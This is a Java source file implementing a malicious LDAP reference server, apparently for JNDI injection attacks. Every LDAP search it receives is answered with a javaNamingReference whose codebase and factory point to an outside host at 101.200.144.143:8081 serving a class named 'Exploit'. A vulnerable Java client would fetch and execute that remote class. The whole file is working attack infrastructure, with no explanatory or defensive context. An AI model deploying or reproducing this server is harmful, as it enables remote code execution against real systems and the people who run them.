
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;


//http://101.200.144.143:8081/#Exploit 1389
public class LDAPRefServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args){
        int port = 1389;
        try{
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL("http://101.200.144.143:8081/#Exploit")));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();


            }catch (Exception e){
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor{
        private URL codebase;

        public OperationInterceptor (URL cb){
            this.codebase =cb;
        }

        @Override
        public void processSearchResult (InMemoryInterceptedSearchResult result){
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try{
                sendResult(result,base,e);
            }catch (Exception e1){
                e1.printStackTrace();
            }
        }

        protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException,MalformedURLException{
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.','/').concat(".class"));
            System.out.println("Send LDAP reference result for "+base+" redirecting to " +turl);
            e.addAttribute("javaClassName","foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf("#");
            if(refPos >0){
                cbstring = cbstring.substring(0,refPos);
            }
            e.addAttribute("javaCodeBase",cbstring);
            e.addAttribute("objectClass","javaNamingReference");
            e.addAttribute("javaFactory",this.codebase.getRef());
            //System.out.println(this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

}
